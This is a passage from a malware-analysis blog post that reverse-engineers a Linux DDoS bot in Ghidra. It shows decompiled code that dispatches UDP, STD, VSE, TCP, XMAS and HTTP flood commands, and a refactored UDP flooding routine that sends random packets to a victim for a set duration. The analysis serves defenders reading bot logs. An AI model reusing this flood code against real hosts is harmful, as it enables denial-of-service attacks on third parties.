        local_b0 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">7</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>i <span class="sy0">&lt;</span> <span class="nu0">9</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        local_ac <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">else</span> <span class="br0">&#123;</span>
        local_ac <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">8</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      _Var8 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>_Var8 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        udp_attack<span class="br0">&#40;</span>pcVar1<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar4<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar5<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar6<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar7<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>local_b4<span class="sy0">,</span>
                   local_b0<span class="sy0">,</span>local_ac<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">else</span> <span class="br0">&#123;</span>
    iVar5 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_std<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>iVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">2</span> <span class="sy0">&lt;</span> i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        pcVar3 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
        uVar8 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        uVar9 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        _Var10 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>_Var10 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
          std_attack<span class="br0">&#40;</span>pcVar3<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar8<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar9<span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
      <span class="br0">&#125;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">else</span> <span class="br0">&#123;</span>
      iVar5 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_vse<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>iVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>i <span class="sy0">&lt;</span> <span class="nu0">3</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
          <span class="kw1">return</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
        pcVar3 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
        uVar8 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        uVar9 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        _Var10 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>_Var10 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
          vse_attack<span class="br0">&#40;</span>pcVar3<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar8<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar9<span class="br0">&#41;</span><span class="sy0">;</span>
          _exit<span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
      <span class="br0">&#125;</span>
      iVar5 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_tcp<span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>iVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">3</span> <span class="sy0">&lt;</span> i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
          pcVar3 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
          uVar8 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
          uVar9 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
          pcVar2 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">4</span><span class="br0">&#93;</span><span class="sy0">;</span>
          _Var10 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
          <span class="kw1">if</span> <span class="br0">&#40;</span>_Var10 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            tcp_attack<span class="br0">&#40;</span>pcVar3<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar8<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar9<span class="sy0">,</span>pcVar2<span class="br0">&#41;</span><span class="sy0">;</span>
            _exit<span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
          <span class="br0">&#125;</span>
        <span class="br0">&#125;</span>
      <span class="br0">&#125;</span>
      <span class="kw1">else</span> <span class="br0">&#123;</span>
        iVar5 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_xmas<span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>iVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
          <span class="kw1">if</span> <span class="br0">&#40;</span><span class="nu0">2</span> <span class="sy0">&lt;</span> i<span class="br0">&#41;</span> <span class="br0">&#123;</span>
            pcVar3 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
            uVar8 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            uVar9 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            _Var10 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">if</span> <span class="br0">&#40;</span>_Var10 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
              xmas_attack<span class="br0">&#40;</span>pcVar3<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar8<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar9<span class="br0">&#41;</span><span class="sy0">;</span>
              _exit<span class="br0">&#40;</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
          <span class="br0">&#125;</span>
        <span class="br0">&#125;</span>
        <span class="kw1">else</span> <span class="br0">&#123;</span>
          iVar5 <span class="sy0">=</span> <span class="kw3">strcmp</span><span class="br0">&#40;</span><span class="sy0">*</span>command<span class="sy0">,</span>enc_http<span class="br0">&#41;</span><span class="sy0">;</span>
          <span class="kw1">if</span> <span class="br0">&#40;</span><span class="br0">&#40;</span>iVar5 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="sy0">&amp;&amp;</span> <span class="br0">&#40;</span><span class="nu0">3</span> <span class="sy0">&lt;</span> i<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            pcVar3 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">1</span><span class="br0">&#93;</span><span class="sy0">;</span>
            uVar8 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">2</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            uVar9 <span class="sy0">=</span> <span class="kw3">atoi</span><span class="br0">&#40;</span>command<span class="br0">&#91;</span><span class="nu0">3</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            pcVar4 <span class="sy0">=</span> command<span class="br0">&#91;</span><span class="nu0">4</span><span class="br0">&#93;</span><span class="sy0">;</span>
            _Var10 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="kw1">if</span> <span class="br0">&#40;</span>_Var10 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
              http_attack<span class="br0">&#40;</span>pcVar3<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar8<span class="sy0">,</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>uVar9<span class="sy0">,</span>pcVar4<span class="br0">&#41;</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
          <span class="br0">&#125;</span>
        <span class="br0">&#125;</span>
      <span class="br0">&#125;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>When glancing over this function, one can get a clear overview of its structure. Using multiple string compare calls, the given command is compared to multiple types of attacks. Below, a shortened version of the structure is given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> UDP<span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;UDP&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;STD&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;VSE&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;TCP&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;XMAS&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span><span class="kw3">strcmp</span><span class="br0">&#40;</span>command<span class="sy0">,</span> <span class="st0">&quot;HTTP&quot;</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="co1">//Execute command</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Based on the amount of parameters that some attacks require, one can deduce that the size of the string array that contains the command ranges between 4 and 9, including the command itself.</p>
<p>The easiest way to see what the value of the command fields are, one can analyse a function. A small one, such as the <em>std_attack</em> function will provide information about the first three arguments. The code is given below after comitting the locals and changing the type of <em>local_48</em> from <em>sa_family_t</em> to <em>sockaddr_in</em>.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> std_attack<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>pcParm1<span class="sy0">,</span><span class="kw4">uint16_t</span> uParm2<span class="sy0">,</span><span class="kw4">int</span> iParm3<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">int</span> __fd<span class="sy0">;</span>
  <span class="kw4">int</span> iVar1<span class="sy0">;</span>
  <span class="kw4">void</span> <span class="sy0">*</span>__buf<span class="sy0">;</span>
  time_t tVar2<span class="sy0">;</span>
  time_t tVar1<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
  <span class="kw4">long</span> lVar4<span class="sy0">;</span>
  <span class="kw4">char</span> local_5c<span class="sy0">;</span>
  sockaddr_in local_48<span class="sy0">;</span>
  <span class="kw4">int</span> local_2c<span class="sy0">;</span>
  <span class="kw4">void</span> <span class="sy0">*</span>local_28<span class="sy0">;</span>
  <span class="kw4">int</span> local_20<span class="sy0">;</span>
  <span class="kw4">int</span> local_1c<span class="sy0">;</span>
&nbsp;
  __buf <span class="sy0">=</span> <span class="kw3">malloc</span><span class="br0">&#40;</span><span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
  __fd <span class="sy0">=</span> socket<span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  local_48.<span class="me1">sin_family</span> <span class="sy0">=</span> <span class="nu0">2</span><span class="sy0">;</span>
  local_48.<span class="me1">sin_addr</span> <span class="sy0">=</span> inet_addr<span class="br0">&#40;</span>pcParm1<span class="br0">&#41;</span><span class="sy0">;</span>
  local_48.<span class="me1">sin_port</span> <span class="sy0">=</span> htons<span class="br0">&#40;</span>uParm2<span class="br0">&#41;</span><span class="sy0">;</span>
  tVar2 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span> <span class="br0">&#123;</span>
    lVar4 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>tVar2 <span class="sy0">+</span> iParm3<span class="br0">&#41;</span><span class="sy0">;</span>
    tVar1 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>lVar4 <span class="sy0">&lt;=</span> tVar1<span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
    pcVar3 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>__buf <span class="sy0">+</span> <span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
    iVar1 <span class="sy0">=</span> <span class="kw3">rand</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    local_5c <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>iVar1 <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span>iVar1 <span class="sy0">/</span> <span class="nu12">0x46</span><span class="br0">&#41;</span> <span class="sy0">*</span> <span class="sy0">-</span><span class="nu12">0x46</span><span class="sy0">;</span>
    <span class="sy0">*</span>pcVar3 <span class="sy0">=</span> local_5c <span class="sy0">+</span> <span class="nu12">0x1e</span><span class="sy0">;</span>
    connect<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>local_48<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
    send<span class="br0">&#40;</span>__fd<span class="sy0">,</span>__buf<span class="sy0">,</span><span class="nu12">0x400</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw3">free</span><span class="br0">&#40;</span>__buf<span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Based on this, the first two parameters can be observed in a single glance. The first one is the address of the vicitm, whilst the second one is the victim&#8217;s port. The arguments can be renamed <em>target_address</em> and <em>target_port</em> respectively. The <em>local_48</em> variable can be renamed to <em>socketAddress</em>.</p>
<p>The socket is a <em>AF_INET</em> <em>SOCK_DGRAM</em> socket using the default protocol. The <em>SOCK_DGRAM</em> type is used to make a UDP connection.</p>
<p>The rest of the function is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">tVar2 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span> <span class="br0">&#123;</span>
  lVar4 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>tVar2 <span class="sy0">+</span> param_3<span class="br0">&#41;</span><span class="sy0">;</span>
  tVar1 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>lVar4 <span class="sy0">&lt;=</span> tVar1<span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  pcVar3 <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>__buf <span class="sy0">+</span> <span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
  iVar1 <span class="sy0">=</span> <span class="kw3">rand</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  local_5c <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>iVar1 <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span>iVar1 <span class="sy0">/</span> <span class="nu12">0x46</span><span class="br0">&#41;</span> <span class="sy0">*</span> <span class="sy0">-</span><span class="nu12">0x46</span><span class="sy0">;</span>
  <span class="sy0">*</span>pcVar3 <span class="sy0">=</span> local_5c <span class="sy0">+</span> <span class="nu12">0x1e</span><span class="sy0">;</span>
  connect<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddress<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
  send<span class="br0">&#40;</span>__fd<span class="sy0">,</span>__buf<span class="sy0">,</span><span class="nu12">0x400</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw3">free</span><span class="br0">&#40;</span>__buf<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variabled named <em>tVar2</em> is equal to the amount of seconds that have passed since epoch, and can thus be renamed to <em>currentTime</em>. The variable <em>lVar4</em> is equal to the current time plus the third parameter. After that, another variable is set equal to the current time, this variable can be renamed to <em>newTime</em>.</p>
<p>If the <em>newTime</em> variable is bigger than (or equal to) than the the first moment in time plus the value of the third parameter, the endless while-loop exits. Based on this, one can deduce that the third parameter is equal to the value in seconds that the attack should last. Therefore, the third variable can be renamed to <em>attackDuration</em>. The <em>lVar4</em> variable can be renamed to <em>finalTime</em>.</p>
<p>After that, the <em>__buf</em> variable is filled with random variables. The <a href="https://www.tutorialspoint.com/c_standard_library/c_function_rand.htm">rand</a> function was seeded in the <em>main</em> function, based on the then current time and process ID. The random value is divided by <em>0x46</em>, after which <em>0x46</em> is subtracted. The value is then stored in the buffer, after which a connection to the target is made and the data is sent. The refactored code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span> <span class="br0">&#123;</span>
  finalTime <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>currentTime <span class="sy0">+</span> attackDuration<span class="br0">&#41;</span><span class="sy0">;</span>
  newTime <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>finalTime <span class="sy0">&lt;=</span> newTime<span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  bufferPointer <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>__buf <span class="sy0">+</span> <span class="nu12">0x400</span><span class="br0">&#41;</span><span class="sy0">;</span>
  randomValue <span class="sy0">=</span> <span class="kw3">rand</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  subtractedRandomValue <span class="sy0">=</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span>randomValue <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">char</span><span class="br0">&#41;</span><span class="br0">&#40;</span>randomValue <span class="sy0">/</span> <span class="nu12">0x46</span><span class="br0">&#41;</span> <span class="sy0">*</span> <span class="sy0">-</span><span class="nu12">0x46</span><span class="sy0">;</span>
  <span class="sy0">*</span>bufferPointer <span class="sy0">=</span> subtractedRandomValue <span class="sy0">+</span> <span class="nu12">0x1e</span><span class="sy0">;</span>
  connect<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="br0">&#40;</span>sockaddr <span class="sy0">*</span><span class="br0">&#41;</span><span class="sy0">&amp;</span>socketAddress<span class="sy0">,</span><span class="nu12">0x10</span><span class="br0">&#41;</span><span class="sy0">;</span>
  send<span class="br0">&#40;</span>__fd<span class="sy0">,</span>__buf<span class="sy0">,</span><span class="nu12">0x400</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The other attacks will construct the request (or payload, depending on your definition and perspective) differently. Going into those will be needlessly lengthy without adding much value to this article.</p>
<p><a name ="conclusion"></a></p>
<h2><a href="#conclusion">Conclusion</a></h2>
<p>Other attacks require more specific arguments, but the base line has been set, which allows the reverse engineer to get a basic understanding of the command scheme that is used within the bot. When analysing the logs of a hacked machine that was used as a bot, it is now possible to understand which targets were attacked and how long the attacks took place.</p>
<p>Additionally, some core concepts of Ghidra have been explorered and used during the analysis. When working with the correct data types, the code (be it disassembly or decompiled) is much more accurate. This leads to less mistakes and a quicker analysis while there are no downsides.</p>
<hr />
<p>To contact me, you can e-mail me at [info][at][maxkersten][dot][nl], or DM me on Twitter <a href="https://twitter.com/Libranalysis">@Libranalysis</a>.</p>
					</div><!-- .entry-content -->
			</div><!-- .inside-article -->
</article><!-- #post-## -->

				
								</main><!-- #main -->
	</div><!-- #primary -->

<div id="right-sidebar" itemtype="http://schema.org/WPSideBar" itemscope="itemscope" role="complementary" class="widget-area grid-25 tablet-grid-25 grid-parent sidebar">
	<div class="inside-right-sidebar">
				
		<aside id="recent-posts-2" class="widget inner-padding widget_recent_entries">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://maxkersten.nl/2024/11/27/ghidra-tip-0x08-scripting-with-microservices/">Ghidra Tip 0x08: Scripting with microservices</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/10/31/ghidra-tip-0x07-iterating-over-all-strings-in-a-program/">Ghidra Tip 0x07: Iterating over all strings in a Program</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/09/28/ghidra-tip-0x06-domainfiles-in-projects/">Ghidra Tip 0x06: DomainFiles in Projects</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/08/18/my-impression-of-tdi-2024-blackhat-usa-2024-and-defcon-32/">My impression of TDI 2024, BlackHat USA 2024 and DEFCON 32</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/06/30/ghidra-tip-0x05-headless-execution/">Ghidra Tip 0x05: Headless execution</a>
									</li>
					</ul>

		</aside><aside id="archives-2" class="widget inner-padding widget_archive"><h4 class="widget-title">Archives</h4>
			<ul>
					<li><a href='https://maxkersten.nl/2024/11/'>November 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/10/'>October 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/09/'>September 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/08/'>August 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/06/'>June 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/05/'>May 2024</a></li>
